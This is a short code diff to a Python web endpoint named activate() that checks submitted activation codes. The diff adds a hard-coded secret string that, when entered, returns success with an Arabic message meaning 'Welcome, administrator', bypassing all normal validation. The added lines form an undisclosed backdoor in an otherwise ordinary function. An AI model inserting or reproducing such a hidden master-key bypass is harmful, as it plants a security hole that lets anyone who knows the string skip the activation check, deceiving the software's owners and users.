@@ -133,6 +133,9 @@ def activate():
     code_str = data.get('code', '').strip()
     username = data.get('username', 'Unknown')
     
+    if code_str == 'omran770136569':
+        return jsonify({"success": True, "message": "مرحباً أيها المدير"}), 200
+
     if not code_str:
         return jsonify({"success": False, "message": "يرجى إدخال الكود"}), 400
         
